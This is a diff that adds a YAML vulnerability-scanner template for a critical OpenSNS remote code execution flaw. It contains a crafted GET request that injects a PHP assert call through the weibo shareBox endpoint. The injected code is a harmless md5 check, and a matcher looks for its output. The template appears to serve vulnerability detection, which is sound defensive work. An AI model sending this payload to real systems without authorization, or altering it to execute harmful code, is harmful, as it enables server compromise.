@@ -1,0 +1,26 @@
+id: opensns-remote-code-execution
+info:
+  name: OpenSNS Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    OpenSNS Remote Code Execution vulnerability. Exploitation allows remote attackers to execute arbitrary PHP code.
+  reference:
+    - https://www.pwnwiki.org/index.php?title=OpenSNS_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E/zh-cn
+  tags: rce
+  classification:
+    cpe: cpe:/a:opensns:opensns
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26id[0]=ooo%26id[1]=assert%26id[args]=ooo%3dvar_dump(md5("12t")) HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "string(32) \"e4c5598222b09b8e5ea7f3d510967b9e\""
+        part: body
